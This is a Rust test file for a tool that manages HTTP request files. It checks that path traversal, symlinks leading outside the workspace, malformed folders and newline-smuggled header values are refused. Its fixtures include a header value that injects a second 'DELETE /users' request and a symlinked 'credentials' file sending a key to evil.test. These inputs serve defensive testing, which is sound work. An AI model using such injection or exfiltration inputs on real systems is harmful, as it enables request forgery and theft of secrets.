use super::*;
use crate::workspace::tests::{temp_workspace, write};

#[test]
fn get_rejects_paths_outside_workspace() {
    let root = temp_workspace("escape");
    assert!(matches!(
        get(&root, "../secret.http"),
        Err(Error::Invalid(_))
    ));
}

#[test]
fn line_breaks_in_fields_are_rejected_before_writing() {
    let root = temp_workspace("validate");
    let mut request = Request::new("Bad", "GET", "/x");
    request.headers.push(crate::http_file::Header {
        name: "X".into(),
        value: "a\n\n### Wipe\nDELETE /users".into(),
    });

    assert!(create(&root, "", request.clone()).is_err());
    write(&root, "a.http", "GET /a\n");
    assert!(update(&root, "a.http", request, None).is_err());
    assert_eq!(fs::read_to_string(root.join("a.http")).unwrap(), "GET /a\n");
}

#[test]
fn writes_that_would_read_back_differently_are_refused() {
    let root = temp_workspace("read-back");
    write(&root, "all.http", "### One\nGET /1\n\n### Two\nGET /2\n");
    let request = Request::new("Two", "GET", "/two HTTP/2");

    assert!(update(&root, "all.http#2", request.clone(), None).is_err());
    assert!(create(&root, "", request).is_err());
    assert_eq!(
        fs::read_to_string(root.join("all.http")).unwrap(),
        "### One\nGET /1\n\n### Two\nGET /2\n"
    );
}

#[cfg(unix)]
#[test]
fn request_files_linking_outside_are_not_listed_or_read() {
    let root = temp_workspace("link-file");
    let outside = temp_workspace("link-file-outside");
    write(&outside, "credentials", "GET https://evil.test/?key=AKIA\n");
    std::os::unix::fs::symlink(outside.join("credentials"), root.join("notes.http")).unwrap();
    write(&root, "real.http", "GET /real\n");
    std::os::unix::fs::symlink(root.join("real.http"), root.join("alias.http")).unwrap();

    let (nodes, warnings) = workspace::tree_with_warnings(&root).unwrap();
    let listed = format!("{nodes:?}");
    assert!(!listed.contains("notes.http"), "{listed}");
    assert!(listed.contains("alias.http"), "{listed}");
    assert_eq!(warnings[0].path, "notes.http");
    assert!(matches!(get(&root, "notes.http"), Err(Error::Invalid(_))));
    assert_eq!(get(&root, "alias.http").unwrap().url, "/real");
}

#[cfg(unix)]
#[test]
fn writes_through_a_folder_linking_outside_are_refused() {
    let root = temp_workspace("link-dir");
    let outside = temp_workspace("link-dir-outside");
    write(&outside, "keep.txt", "mine");
    std::os::unix::fs::symlink(&outside, root.join("link")).unwrap();

    let request = Request::new("New", "GET", "/x");
    assert!(matches!(
        create(&root, "link", request),
        Err(Error::Invalid(_))
    ));
    assert!(crate::folders::create(&root, "link", "sub").is_err());
    assert!(crate::folders::remove(&root, "link", true).is_err());
    assert_eq!(
        fs::read_dir(&outside).unwrap().count(),
        1,
        "nothing was written or removed outside"
    );
    assert_eq!(
        fs::read_to_string(outside.join("keep.txt")).unwrap(),
        "mine"
    );
}

#[test]
fn a_broken_folder_toml_stops_moves_before_any_file_changes() {
    let root = temp_workspace("broken-order");
    write(&root, "users/list.http", "GET /users\n");
    write(&root, "users/folder.toml", "order = [\n");
    write(&root, "orders/folder.toml", "");

    assert!(move_to(&root, "users/list.http", "orders", None, None).is_err());
    assert!(root.join("users/list.http").exists());
    assert!(!root.join("orders/list.http").exists());

    assert!(remove(&root, "users/list.http", None).is_err());
    assert!(root.join("users/list.http").exists());

    assert!(create(&root, "users", Request::new("New", "GET", "/new")).is_err());
    assert!(!root.join("users/new.http").exists());
}

#[test]
fn folder_paths_with_extra_slashes_are_refused() {
    let root = temp_workspace("extra-slash");
    write(&root, "users/x.http", "GET /x\n");

    assert!(matches!(
        move_to(&root, "users/x.http", "users/", None, None),
        Err(Error::Invalid(_))
    ));
    assert_eq!(fs::read_dir(root.join("users")).unwrap().count(), 1);
    assert!(create(&root, "users//", Request::new("New", "GET", "/n")).is_err());
    assert!(crate::folders::create(&root, "users/", "Sub").is_err());
    assert_eq!(fs::read_dir(root.join("users")).unwrap().count(), 1);
}
